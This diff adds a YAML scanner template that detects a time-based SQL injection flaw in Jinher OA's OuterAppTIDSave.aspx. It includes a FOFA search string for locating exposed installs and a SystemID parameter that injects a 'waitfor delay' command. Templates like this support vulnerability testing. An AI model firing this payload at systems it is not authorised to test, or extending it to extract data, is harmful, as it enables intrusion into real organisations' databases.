@@ -1,0 +1,28 @@
+id: poc-yaml-jinher-outerapptidsave-aspx-sqli
+info:
+  name: 金和OA OuterAppTIDSave.aspx SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 金和OA
+  fofa: app="金和网络-金和OA"
+variables:
+  t1: random_int(2,5)
+  t2: t1 + t1
+  t3: t2 + 2
+requests:
+- method: GET
+  path: /C6/Jhsoft.Web.login/PassWordSlideFull.aspx
+  expression: status_code == 200 && contains(body,"JHSoft")
+- method: GET
+  path: /c6/Jhsoft.Web.AddMenu/OuterAppTIDSave.aspx/?SystemID='waitfor+delay'0:0:{{.t1}}'--&OuterAppTID=1&AppTID=1
+  expression: 'status_code == 200 &&
+
+    body == "false" &&
+
+    duration >= t2 &&
+
+    duration <= t3
+
+    '
+transport: http
